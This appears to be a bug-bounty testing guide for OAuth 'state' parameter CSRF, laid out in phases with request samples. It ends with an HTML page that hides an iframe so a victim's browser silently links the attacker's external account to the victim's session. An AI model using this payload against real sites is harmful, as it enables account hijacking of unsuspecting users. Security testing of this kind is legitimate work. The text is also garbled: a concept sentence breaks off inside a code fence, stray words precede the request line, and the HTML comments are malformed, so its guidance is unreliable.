# OAuth State Parameter Abuse

## When to Use
- When auditing web applications that use "Log in with [Google/Facebook/GitHub]" (OAuth 2.0 / OpenID Connect) or allow linking third-party accounts.
- To test if the application is susceptible to CSRF attacks during the OAuth authorization flow, enabling attackers to link their own external accounts to a victim's session.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Initiating the OAuth Flow

```text
# Concept: The `state` parameter is ```

### Phase 2: Intercepting the Authorization Request

```http
# # beautifully GET /oauth/authorize?response_type=code&client_id=12345&redirect_uri=https%3A%2F%2Ftarget.com%2Fcallback&scope=email%20profile HTTP/1.1
Host: provider.com
```

### Phase 3: Capturing the Callback (The CSRF Payload)

```http
# https://target.com/callback?code=SPLIT_SECOND_CODE_FROM_ATTACKER
```

### Phase 4: Delivering the Payload (Exploitation)

```html
<!-- >
<html>
  <body>
    <!-- >
    <iframe src="https://target.com/callback?code=ATTACKER_UNPUBLISHED_CODE" style="display:none;"></iframe>
  </body>
</html>
```
